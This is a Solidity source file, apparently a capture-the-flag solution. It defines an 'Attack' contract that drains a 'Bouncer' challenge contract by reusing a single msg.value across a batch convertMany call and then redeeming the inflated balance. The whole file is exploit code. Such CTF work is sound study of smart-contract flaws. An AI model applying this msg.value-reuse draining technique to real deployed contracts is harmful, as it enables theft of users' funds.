// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;
import "./Setup.sol";


contract Attack {
    Bouncer bouncer;
    Setup setup;
    address constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    uint256 public batch = 27.5 ether; 
    uint256[] ids = [0, 1, 2];
    bool public isSolvedAll;

    constructor(Bouncer _bouncer, Setup _setup)
    {
        bouncer = Bouncer(_bouncer);
        setup = Setup(_setup);
    }

    function createEntry() public payable{
        require(msg.value == 3 ether);
        for(uint256 i = 0; i < ids.length; i++){
            bouncer.enter{value: 1 ether}(address(ETH), batch);
        }
    }

    function attack() public payable{
        require(msg.value == batch);
        bouncer.convertMany{value: batch}(address(this), ids);
        bouncer.redeem(ERC20Like(ETH), ids.length*batch);
        isSolvedAll = setup.isSolved();
    }

    fallback() external payable {}
    
}

